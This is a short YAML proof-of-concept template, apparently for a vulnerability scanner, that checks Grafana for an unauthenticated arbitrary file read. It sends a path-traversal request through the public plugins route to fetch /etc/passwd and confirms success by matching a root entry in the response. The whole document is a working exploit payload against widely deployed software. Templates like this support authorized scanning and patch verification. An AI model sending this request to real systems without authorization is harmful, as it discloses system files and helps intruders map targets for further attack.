name: poc-yaml-grafana-unauth-fileread
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /public/plugins/graph/../../../../../../../../../../../../../../../etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
